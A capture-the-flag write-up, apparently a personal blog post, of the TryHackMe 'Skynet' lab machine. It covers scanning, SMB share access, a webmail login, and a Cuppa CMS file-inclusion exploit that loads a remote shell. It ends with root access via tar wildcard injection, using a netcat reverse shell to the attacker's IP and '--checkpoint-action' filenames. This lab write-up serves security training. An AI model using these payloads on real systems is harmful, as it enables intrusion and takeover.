---
title: THM{Skynet}
author: Anugrah SR
date: 2020-11-19 01:30:00 +0800
categories: [Boot2root,Tryhackme]
tags: [ tryhackme, nmap, smb, linux, smbclient, rustscan, Gobuster, burp, wildcard]
math: true
image: "https://blog.tryhackme.com/content/images/size/w2000/2019/09/58601c2a00ccd21300e32bbb16225807.jpg"
---
# Skynet
## About The Room
*A vulnerable Terminator themed Linux machine.*<br>
* Url: https://tryhackme.com/room/skynet
* Creator: [tryhackme](https://tryhackme.com/p/tryhackme)
* Difficulty: low

## Reconnaissance
### RustScan
```bash
rustscan 10.10.206.100 -- -A -sC -sV                                                                                1 ⨯
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/cyph3r/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.206.100:22
Open 10.10.206.100:80
Open 10.10.206.100:110
Open 10.10.206.100:139
Open 10.10.206.100:143
Open 10.10.206.100:445
[~] Starting Nmap
[>] The Nmap command to be run is nmap -A -sC -sV -vvv -p 22,80,110,139,143,445 10.10.206.100

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-18 13:06 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:06
Completed NSE at 13:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:06
Completed NSE at 13:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:06
Completed NSE at 13:06, 0.00s elapsed
Initiating Ping Scan at 13:06
Scanning 10.10.206.100 [2 ports]
Completed Ping Scan at 13:06, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:06
Completed Parallel DNS resolution of 1 host. at 13:06, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:06
Scanning 10.10.206.100 [6 ports]
Discovered open port 22/tcp on 10.10.206.100
Discovered open port 110/tcp on 10.10.206.100
Discovered open port 445/tcp on 10.10.206.100
Discovered open port 139/tcp on 10.10.206.100
Discovered open port 80/tcp on 10.10.206.100
Discovered open port 143/tcp on 10.10.206.100
Completed Connect Scan at 13:06, 0.15s elapsed (6 total ports)
Initiating Service scan at 13:06
Scanning 6 services on 10.10.206.100
Completed Service scan at 13:06, 11.46s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.206.100.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:06
Completed NSE at 13:06, 5.21s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:06
Completed NSE at 13:06, 2.16s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:06
Completed NSE at 13:06, 0.00s elapsed
Nmap scan report for 10.10.206.100
Host is up, received syn-ack (0.15s latency).
Scanned at 2020-11-18 13:06:28 EST for 20s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk=
|   256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        syn-ack Dovecot pop3d
|_pop3-capabilities: TOP SASL CAPA AUTH-RESP-CODE PIPELINING UIDL RESP-CODES
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack Dovecot imapd
|_imap-capabilities: LOGINDISABLEDA0001 have IDLE Pre-login more SASL-IR OK ENABLE listed LITERAL+ post-login capabilities LOGIN-REFERRALS IMAP4rev1 ID
445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 23468/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 47431/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 52570/udp): CLEAN (Failed to receive data)
|   Check 4 (port 65173/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2020-11-18T12:06:41-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-11-18T18:06:41
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:06
Completed NSE at 13:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:06
Completed NSE at 13:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:06
Completed NSE at 13:06, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.38 seconds
```


### Gobuster
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.206.100/    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.206.100/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/11/18 13:13:34 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.10.206.100/admin/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.206.100/css/]  
/js                   (Status: 301) [Size: 311] [--> http://10.10.206.100/js/]   
/config               (Status: 301) [Size: 315] [--> http://10.10.206.100/config/]
/ai                   (Status: 301) [Size: 311] [--> http://10.10.206.100/ai/]    
/squirrelmail         (Status: 301) [Size: 321] [--> http://10.10.206.100/squirrelmail/]
Progress: 38177 / 220561 (17.31%)                                                      ^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2020/11/18 13:24:34 Finished
===============================================================
```
### smbclient
```bash
smbclient -L //10.10.206.100///                    
Enter WORKGROUP\cyph3r's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
```
```bash
smbclient //10.10.206.100/anonymous
Enter WORKGROUP\cyph3r's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 18 00:41:20 2019
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019
  books                               D        0  Wed Sep 18 00:40:06 2019

                9204224 blocks of size 1024. 5370652 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Wed Sep 18 00:41:20 2019
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5369932 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \logs\> exit

```
```bash
cat attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```
## HTTP
![http](https://imgur.com/ZxEvG4Il.png)

`http://10.10.206.100/squirrelmail/`

![](https://imgur.com/7HL6IS7l.png)
### Burp

![](https://imgur.com/CQhrgP1l.png)
What could be the passwords? this file looks like set of possible passwords!
```bash
head log1.txt
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
```
![](https://imgur.com/fClkZQkl.png)
![](https://imgur.com/ZQ9gzQPl.png)
Bingo!
`http://10.10.206.100/squirrelmail/src/webmail.php`
![](https://imgur.com/RztXY85l.png)

Let's see what's in his mail!
```
Subject:   	Samba Password reset
From:   	skynet@skynet
Date:   	Tue, September 17, 2019 9:10 pm
Priority:   	Normal
Options:   	View Full Header |  View Printable Version  | Download this as a file

We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```
We have smb password!
```
From:   	serenakogan@skynet
Date:   	Tue, September 17, 2019 2:16 am
Priority:   	Normal
Options:   	View Full Header |  View Printable Version  | Download this as a file

01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```
![](https://imgur.com/GbKMuLql.png)
`balls have zero to me to me to me to me to me to me to me to me to`

```
From:   	serenakogan@skynet
Date:   	Tue, September 17, 2019 2:13 am
Priority:   	Normal
Options:   	View Full Header |  View Printable Version  | Download this as a file

i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
```
### smbclient
```bash
smbclient //10.10.206.100/milesdyson -U milesdyson                                                                  1 ⨯
Enter WORKGROUP\milesdyson's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019

                9204224 blocks of size 1024. 5369820 blocks available
smb: \> ls
smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \notes\>
```
```bash
cat important.txt
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
![](https://imgur.com/z1MJ8mOl.png)
### Gobuster
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.206.100/45kra24zxs28v3yd/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.206.100/45kra24zxs28v3yd/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/11/18 14:54:45 Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 339] [--> http://10.10.206.100/45kra24zxs28v3yd/administrator/]
```
### Cuppa CMS
![](https://imgur.com/xbj90Xdl.png)
### searchsploit
```bash
searchsploit cuppa cms                            
------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                    | php/webapps/25971.txt
------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
## Gaining Shell
```php
####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22:
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------


#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
```
### Local/Remote File Inclusion  
`http://10.10.206.100/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`
![](https://imgur.com/cdTUVszl.png)

`http://10.10.93.187/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.82.80/rshell.php`

![](https://imgur.com/55k0Goml.png)
## Privilege escalation
### crontab
```bash
www-data@skynet:/home$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@skynet:/home$ cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
www-data@skynet:/home$ vim /home/milesdyson/backups/backup.sh
```
From tryhackme [blog](https://blog.tryhackme.com/skynet-writeup/)
>This gets a shell, navigates to the /var/www/html directory and create a backup of everything in the directory.

>Well, believe it or not, this creates a vulnerability as we can use it to  execute code. [HelpNetSecurity](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) best explains how this vulnerability works, but in essence, tar has wildcards and we can use checkpoint actions to execute commands.

```bash
cd /var/www/html
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.82.80 1235 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```
![](https://imgur.com/PnQ7Yi2l.png)
### User flag
```bash
root@skynet:/home/milesdyson# cat user.txt
cat user.txt
7cexxxxxxxxxxxxxxxxxxxx807
```

### Root flag
```bash
root@skynet:~# cat root.txt
cat root.txt
3f03xxxxxxxxxxxxxxxxxxa949
```
